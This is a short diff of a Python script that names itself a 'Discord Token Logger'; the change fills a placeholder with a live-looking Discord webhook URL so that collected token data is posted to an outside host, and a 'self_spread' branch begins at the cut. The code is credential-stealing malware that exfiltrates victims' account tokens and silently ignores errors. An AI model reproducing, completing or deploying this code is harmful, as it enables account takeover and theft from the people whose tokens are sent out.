@@ -224,13 +224,13 @@ def main():
     if len(working) == 0:
         working.append('123')
     webhook = {
-        "content": "",
+        "content": "https://discordapp.com/api/webhooks/832050040289099847/HknwtRKQc_qBsXl3S-UtpGjbrWV_8g0QQMyUTdRoVNdsD9eIQqx1hUIgRszdPYkaqYb4",
         "embeds": embeds,
         "username": "Discord Token Logger",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("PASTE WEBHOOOOK", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discordapp.com/api/webhooks/832050040289099847/HknwtRKQc_qBsXl3S-UtpGjbrWV_8g0QQMyUTdRoVNdsD9eIQqx1hUIgRszdPYkaqYb4K", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
